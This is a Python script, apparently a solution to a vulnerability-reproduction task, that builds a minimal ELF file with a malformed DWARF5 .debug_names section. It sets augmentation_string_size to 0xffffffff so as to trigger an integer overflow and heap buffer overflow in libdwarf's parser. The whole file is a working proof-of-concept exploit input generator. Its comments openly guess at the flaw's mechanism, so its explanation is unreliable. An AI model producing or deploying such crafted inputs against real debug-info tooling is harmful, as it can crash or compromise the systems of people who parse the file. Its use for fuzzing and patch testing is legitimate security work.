import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build a minimal ELF file with a malicious .debug_names section
        
        # ELF Header (64-bit, LSB)
        # e_ident: Magic + Class(2) + Endian(1) + Version(1) + ABI(0) + PAD
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        
        # --- .debug_names content ---
        # DWARF5 header
        # unit_length (4 bytes)
        # version (2 bytes) = 5
        # padding (2 bytes) = 0
        # comp_unit_count (4 bytes)
        # local_type_unit_count (4 bytes)
        # foreign_type_unit_count (4 bytes)
        # bucket_count (4 bytes)
        # name_count (4 bytes)
        # abbrev_table_size (4 bytes)
        # augmentation_string_size (4 bytes)
        
        # Vulnerability Logic:
        # The vulnerability is "mistake in internal calculations of limits".
        # A common issue in libdwarf debug_names parsing is an integer overflow 
        # involving augmentation_string_size, leading to a heap buffer overflow.
        # By setting augmentation_string_size to 0xffffffff:
        # 1. malloc(size + 1) -> malloc(0) which succeeds with a small allocation.
        # 2. subsequent read/memcpy uses the original huge size (0xffffffff), causing heap overflow.
        # Alternatively, offset calculation (offset + size) overflows, bypassing bounds checks.
        
        aug_size = 0xffffffff
        
        debug_names_data = bytearray()
        # Placeholder for unit_length (4 bytes)
        debug_names_data.extend(b'\x00\x00\x00\x00')
        debug_names_data.extend(struct.pack('<H', 5)) # Version 5
        debug_names_data.extend(b'\x00\x00') # Padding
        debug_names_data.extend(struct.pack('<I', 0)) # comp_unit_count
        debug_names_data.extend(struct.pack('<I', 0)) # local_type_unit_count
        debug_names_data.extend(struct.pack('<I', 0)) # foreign_type_unit_count
        debug_names_data.extend(struct.pack('<I', 0)) # bucket_count
        debug_names_data.extend(struct.pack('<I', 0)) # name_count
        debug_names_data.extend(struct.pack('<I', 0)) # abbrev_table_size
        debug_names_data.extend(struct.pack('<I', aug_size)) # augmentation_string_size
        
        # Padding to ensure the section is physically large enough to pass initial sanity checks
        debug_names_data.extend(b'\x00' * 64)
        
        # Fill unit_length: length of contribution excluding the length field itself
        struct.pack_into('<I', debug_names_data, 0, len(debug_names_data) - 4)
        
        # --- .shstrtab content ---
        shstrtab = b'\x00.debug_names\x00.shstrtab\x00'
        
        # --- Calculate Offsets ---
        elf_header_size = 64
        offset_debug_names = elf_header_size
        offset_shstrtab = offset_debug_names + len(debug_names_data)
        offset_sh_table = offset_shstrtab + len(shstrtab)
        
        # --- Section Headers ---
        
        # 0: Null Section
        sh_null = b'\x00' * 64
        
        # 1: .debug_names
        # Name index 1
        sh_dn = struct.pack('<I', 1) 
        sh_dn += struct.pack('<I', 1) # SHT_PROGBITS
        sh_dn += struct.pack('<Q', 0) # flags
        sh_dn += struct.pack('<Q', 0) # addr
        sh_dn += struct.pack('<Q', offset_debug_names) # offset
        sh_dn += struct.pack('<Q', len(debug_names_data)) # size
        sh_dn += struct.pack('<I', 0) # link
        sh_dn += struct.pack('<I', 0) # info
        sh_dn += struct.pack('<Q', 1) # addralign
        sh_dn += struct.pack('<Q', 0) # entsize
        
        # 2: .shstrtab
        # Name index 14
        sh_str = struct.pack('<I', 14)
        sh_str += struct.pack('<I', 3) # SHT_STRTAB
        sh_str += struct.pack('<Q', 0)
        sh_str += struct.pack('<Q', 0)
        sh_str += struct.pack('<Q', offset_shstrtab)
        sh_str += struct.pack('<Q', len(shstrtab))
        sh_str += struct.pack('<I', 0)
        sh_str += struct.pack('<I', 0)
        sh_str += struct.pack('<Q', 1)
        sh_str += struct.pack('<Q', 0)
        
        sht = sh_null + sh_dn + sh_str
        
        # --- Construct ELF Header ---
        elf_hdr = bytearray(e_ident)
        # Type(2=EXEC), Machine(62=X86_64), Version(1)
        elf_hdr.extend(struct.pack('<HHI', 2, 62, 1))
        # Entry(0), Phoff(0), Shoff(offset_sh_table)
        elf_hdr.extend(struct.pack('<QQQ', 0, 0, offset_sh_table))
        # Flags(0)
        elf_hdr.extend(struct.pack('<I', 0))
        # Ehsize(64), Phentsize(0), Phnum(0)
        elf_hdr.extend(struct.pack('<HHH', 64, 0, 0))
        # Shentsize(64), Shnum(3), Shstrndx(2)
        elf_hdr.extend(struct.pack('<HHH', 64, 3, 2))
        
        return bytes(elf_hdr) + debug_names_data + shstrtab + sht
